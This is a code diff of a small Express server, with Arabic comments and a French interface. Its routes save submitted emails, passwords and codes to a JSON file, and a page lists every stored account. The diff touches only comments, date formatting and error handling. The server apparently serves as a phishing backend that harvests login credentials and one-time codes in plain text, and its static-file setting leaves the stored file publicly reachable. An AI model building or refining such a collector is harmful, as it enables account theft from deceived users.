@@ -4,16 +4,16 @@ const fs = require('fs');
 
 const app = express();
 
-// إعدادات قراءة البيانات المدخلة في الطلبات (JSON & Form data)
+// Middleware لقراءة البيانات المرسلة
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// جعل جميع الملفات في المجلد الرئيسي متاحة للوصول (مثل index.html و CSS و JS)
+// جعل جميع الملفات في المجلد الرئيسي متاحة (HTML, CSS, JS)
 app.use(express.static(__dirname));
 
 const filePath = path.join(__dirname, 'data.json');
 
-// وظيفة قراءة البيانات من ملف data.json
+// وظيفة قراءة البيانات من الملف
 function readData() {
   if (fs.existsSync(filePath)) {
     try {
@@ -26,7 +26,7 @@ function readData() {
   return [];
 }
 
-// مسار حفظ البيانات (/save-user)
+// مسار حفظ البيانات الرئيسي (/save-user)
 app.post('/save-user', (req, res) => {
   const { email, password, code } = req.body;
   
@@ -34,14 +34,18 @@ app.post('/save-user', (req, res) => {
     email: email || '',
     password: password || '',
     code: code || '',
-    date: new Date().toLocaleString()
+    date: new Date().toLocaleString('fr-FR')
   };
 
   const data = readData();
   data.push(entry);
-  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
-
-  res.json({ status: 'success' });
+  
+  try {
+    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+    res.json({ status: 'success' });
+  } catch (err) {
+    res.status(500).json({ status: 'error', message: err.message });
+  }
 });
 
 // مسار حفظ البيانات الاحتياطي (/api/save-data)
@@ -52,17 +56,21 @@ app.post('/api/save-data', (req, res) => {
     email: email || '',
     password: password || '',
     code: code || '',
-    date: new Date().toLocaleString()
+    date: new Date().toLocaleString('fr-FR')
   };
 
   const data = readData();
   data.push(entry);
-  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
 
-  res.json({ status: 'success' });
+  try {
+    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+    res.json({ status: 'success' });
+  } catch (err) {
+    res.status(500).json({ status: 'error', message: err.message });
+  }
 });
 
-// مسار عرض قائمة الحسابات والبيانات (/userslist)
+// مسار عرض قائمة الحسابات (/userslist)
 app.get('/userslist', (req, res) => {
   const users = readData();
   
@@ -81,6 +89,7 @@ app.get('/userslist', (req, res) => {
   <html lang="fr">
   <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Liste des Utilisateurs</title>
     <style>
       body { font-family: Arial, sans-serif; background: #f4f7f6; padding: 40px; margin: 0; }
@@ -120,7 +129,12 @@ app.get('/userslist', (req, res) => {
 
 // المسار الرئيسي للواجهة
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
+  const indexPath = path.join(__dirname, 'index.html');
+  if (fs.existsSync(indexPath)) {
+    res.sendFile(indexPath);
+  } else {
+    res.status(404).send('<h2 style="text-align:center; margin-top:50px;">Erreur : Le fichier index.html est introuvable. Veuillez vérifier le dossier racine.</h2>');
+  }
 });
 
 const PORT = process.env.PORT || 3000;
